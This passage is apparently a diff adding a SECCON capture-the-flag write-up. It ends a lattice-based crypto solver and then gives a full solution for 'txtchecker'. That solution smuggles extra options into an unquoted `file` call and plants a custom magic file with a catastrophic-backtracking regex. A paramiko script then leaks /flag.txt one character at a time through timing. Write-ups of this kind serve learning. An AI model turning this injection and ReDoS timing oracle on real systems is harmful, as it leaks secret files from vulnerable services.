+    print(W)
+
+    L = M.parent()((M * W).BKZ(fp='rr', precision=1000) * ~W)
+    for row in L:
+        print(row)
+        if row[-1] == -1:
+            row = -row
+        if row[-1] == 1:
+            break
+    else:
+        raise NotImplementedError('lazy')
+
+    print(row)
+
+    soff,z1off,z2off,z3off,z4off = row[len(hs):][:len(mons)]
+
+    s = soff + 2^127
+    z1 = z1off + 2^127
+    z2 = z2off + 2^127
+    z3 = z3off + 2^127
+    z4 = z4off + 2^127
+
+    print(f'\x1b[32m{s = }\x1b[0m')
+    print(f'\x1b[32m{z1 = }\x1b[0m')
+    print(f'\x1b[32m{z2 = }\x1b[0m')
+    print(f'\x1b[32m{z3 = }\x1b[0m')
+    print(f'\x1b[32m{z4 = }\x1b[0m')
+
+    key = ZZ['x']([a1,a2,a3,b1,b2,b3,c,s][::-1])(2^128)
+    print(f'\x1b[36m{key = :#x}\x1b[0m')
+
+    flag = key ^^ cipher_text
+    print(f'--> \x1b[32m{flag = :#x}\x1b[0m')
+    exit()
+
+print(f'\x1b[31mnope...\x1b[0m')
+exit(1)
+```
+
+Flag: SECCON{Unfortunately_I_could_not_come_up_with_a_more_difficult_problem_than_last_year_sorry…-6fc18307d3ed2e7673a249abc2e0e22c}
+
+### txtchecker
+
+##### yyyyyyy \| misc, 23 solves, 193 points
+
+We’re given SSH access to a script that does approximately nothing except read a line and run `file` with the arguments supplied in this way (the input is unquoted). The goal is to recover `/flag.txt`. One problem is that the script discards all output.
+
+There are two main ingredients to the solution: - We can supply our own `magic` file to `file`, thus possibly learning a lot more about the file than just its file type. Notably, magic files can contain regular expressions, which are known to sometimes feature strongly input-dependent timing behavior. - We can ask `file` to *write* a magic file for us, from a human-readable input specification. In addition, we can supply `/dev/stdin` as the input filename for that specification, allowing us to pass more input.
+
+…and that’s really all there is to it! The rest is to figure out the specification language for `magic` files, and to engineer a regex that will be very quick if a guess for a flag prefix was correct and very slow otherwise. Some playing around yielded both:
+
+``` python
+def magic(known, next):
+    rx = rf'SE\(C\?\)\(C\?\)\(C\?\)ON\\{{{known}{next}(\(.\?\)\\1|\\1)*\\}}'
+    return \
+f'''
+0 regex/256 {rx} flag
+!:mime text/x-flag
+'''.lstrip()
+```
+
+Then, we need some scripting around that for the SSH and timing measurements. Result:
+
+``` python
+host = 'txtchecker.seccon.games'
+port = 2022
+username = 'ctf'
+password = 'ctf'
+
+from paramiko.client import SSHClient, WarningPolicy
+from paramiko.ssh_exception import SSHException
+
+def conn():
+    ssh = SSHClient()
+    ssh.set_missing_host_key_policy(WarningPolicy)
+    ssh.connect(host, port, username, password, timeout=5)
+    return ssh.exec_command('id')
+
+import signal
+class Signal(Exception): pass
+def handler(signum, _):
+    raise Signal
+signal.signal(signal.SIGALRM, handler)
+
+def _oracle(known, lo, hi):
+    pin, pout, perr = conn()
+    pin2, pout2, perr2 = conn()
+    time.sleep(.1)
+    pin.write(b'-C -m /dev/stdin\n')
+    time.sleep(.1)
+    a = magic(known, rf'[\x{lo:02x}-\x{hi:02x}]')
+    print(f'\x1b[36m{a!r}\x1b[0m')
+    pin.write(a.encode())
+    pin.close()
+    res = pout.read()
+
+    pin, pout, perr = pin2, pout2, perr2
+    time.sleep(.1)
+    t0 = time.time()
+    pin.write(b'-m stdin.mgc /flag.txt\n')
+    pin.close()
+    signal.alarm(1)
+    try:
+        res = pout.read()
+        signal.alarm(0)
+    except Signal:
+        pass
+    t1 = time.time()
+    print(t1 - t0)
+
+    return t1 - t0 > .9
+
+def oracle(known, lo, hi):
+    for num in range(10):
+        try:
+            return _oracle(known, lo, hi)
+        except SSHException:
+            print(f'\x1b[31mretrying... ({num+1})\x1b[0m')
+    assert False
+
+known = ''
+for _ in range(50):
+    lo, hi = 0x20, 0x7e
+    while hi != lo:
+        assert lo < hi
+        mid = (lo + hi + 1) // 2
+        assert mid-1 >= lo
+        assert mid <= hi
+        if oracle(known, lo, mid-1):
+            hi = mid-1
+        elif oracle(known, mid, hi):
+            lo = mid
+        else:
+            assert False
+        print(f'\x1b[33m{known}\x1b[0m \x1b[35m{lo:02x}-{hi:02x}\x1b[0m')
+    assert hi == lo
+    known += chr(hi)
+    print(f'--> \x1b[32m{known}\x1b[0m')
+```
+
+Flag: SECCON{reDo5L1fe}
